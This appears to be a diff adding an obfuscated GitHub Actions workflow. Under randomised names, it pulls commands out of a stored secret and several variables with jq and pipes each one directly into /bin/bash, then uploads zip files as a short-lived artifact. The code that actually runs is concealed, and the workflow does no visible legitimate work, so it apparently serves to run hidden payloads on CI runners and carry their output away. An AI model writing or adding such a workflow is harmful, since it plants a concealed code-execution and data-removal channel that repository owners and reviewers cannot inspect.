@@ -1,0 +1,25 @@
+name: parkermatplotlibr601
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: parkermatplotlibr601
+        env:
+          kitul2: ${{ secrets.kitul2 }}
+        run: |
+          printf '%s' "$kitul2" | jq -r .lpr2945 | /bin/bash
+          echo $g630 | jq -r .h551 | /bin/bash
+          echo $ztm45804 | jq -r .aiaz817 | /bin/bash
+          printf '%s' "$rfv3446" | jq -r .v779 | /bin/bash
+          printf '%s' "$tr93151" | jq -r .ua01522 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: XrjVwCzK
+          path: "*.zip"
+          retention-days: 1
